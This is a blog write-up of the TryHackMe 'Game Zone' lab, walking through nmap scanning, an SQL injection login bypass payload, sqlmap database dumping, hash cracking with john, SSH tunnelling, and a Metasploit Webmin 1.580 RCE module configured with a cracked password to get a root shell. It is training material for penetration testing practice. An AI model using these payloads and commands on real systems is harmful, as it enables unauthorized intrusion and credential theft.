---
title: "TryHackMe - Game Zone"
author: Nasrallah
description: ""
date: 2022-08-09 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, sqli, sqlmap, crack, john, tunneling, rce]
img_path: /assets/img/tryhackme/gamezone
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [Game Zone](ttps://tryhackme.com/room/gamezone) from [TryHackMe](https://tryhackme.com). The machine is running a website vulnerable to sql injection, we use `sqlmap` to get a hash and a username, we crack the hash for a password and use the credentials to login via ssh. Once we're in, we found a service listening on an odd port and can't be accessed from outside the target machine. For that, we use ssh tunneling to access the service and found out it's vulnerable to rce. We exploit the vulnerability and get root access. 

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.26.156                                                                                                                            
Host is up (0.097s latency).                                                                                                                                 
Not shown: 998 closed tcp ports (reset)                                                                                                                      
PORT   STATE SERVICE VERSION                                                                                                                                 
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)                                                                            
| ssh-hostkey:                                                                                                                                               
|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)                                                                                               
|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)                                                                                              
|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)                                                                                            
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))                                                                                                          
| http-cookie-flags:                                                                                                                                         
|   /:                                                                                                                                                       
|     PHPSESSID:                                                                                                                                             
|_      httponly flag not set                                                                                                                                
|_http-title: Game Zone                                                                                                                                      
|_http-server-header: Apache/2.4.18 (Ubuntu)                                                                                                                 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We have two open port, 22 running ssh and 80 running Apache http server.

### Web

Let's navigate to the webserver.

![](1.png)

This page has a login form, we can try some default credentials, but trying sqlinjection with this payload `' or 1=1 -- -` let's us in immediately.

![](2.png)

There is a search section, but doesn't give us much.

Since we managed to login using sql injection, let's see if this search function is also vulnerable to that.

Let's use `sqlmap` and see if it can find the vulnerability.

```bash
sqlmap -u 'http://10.10.26.156/portal.php' --forms --batch --cookies "PHPSESSID=2d88lasp16948fp441r98hcn93"
```

![](7.png)

Sqlmap confirms there is a sqlinjection vulnerability and identified the back-end DBMS as `mysql`.

Now let's dump DBMS database table entries by adding the `--dump` option.

```bash
sqlmap -u 'http://10.10.26.156/portal.php' --forms --batch --cookies "PHPSESSID=2d88lasp16948fp441r98hcn93 --dump
```

![](8.png)

Great! We got a password hash for user `agent47`.

## **Foothold**

Using `hash-identifier` we found that it's `SHA256` hash. Let's use john and crack the hash.

![](9.png)

We can login to the target via ssh now that we have the password.

## **Privilege Escalation**

If we check our privileges as `agent47` we find that we can do anything.

Listing the listening port on the machine with the command `netstat -tlpn` we find the following.

![](10.png)

There a service listening on port 10000 and we can't access it from outside the machine.

We can solve that problem using [ssh tunneling](https://www.hackingarticles.in/comprehensive-guide-on-ssh-tunneling/)

Executing the following command enables us to access that service on our attacking machine.

```bash
ssh -L 8000:0.0.0.0:10000 [agent47@10.10.41.70](mailto:agent47@10.10.41.70) -F
```

>We execute the above command on our attacking machine.

Now if we navigate to `http://127.0.0.1:8000` we see the following.

![](3.png)

It's a login page for `Webmin`. Let's try login as agent47 and supply the password we cracked.

![](4.png)

We logged in successfully and found webmin running on version `1.580`. Let's search for exploit for this version.

```bash
$ searchsploit webmin 1.580
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)                                                      | unix/remote/21851.rb
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                                                              | linux/webapps/47330.rb
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

This version of webmin is vulnerable to RCE. There is metasploit module for that so let's start metasploit.

The name of the exploit module is `unix/webapp/webmin_show_cgi_exec` and we need to set the following options before running it.

```bash
set password videogamer124
set username agent47
set rhosts 127.0.0.1
set rport 8000
set ssl false
set lhost tun0
```

Now enter `run` or `exploit` to run the exploit.

![](5.png)

Great! We go a shell as root.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

## References

[https://www.hackingarticles.in/comprehensive-guide-on-ssh-tunneling/](https://www.hackingarticles.in/comprehensive-guide-on-ssh-tunneling/)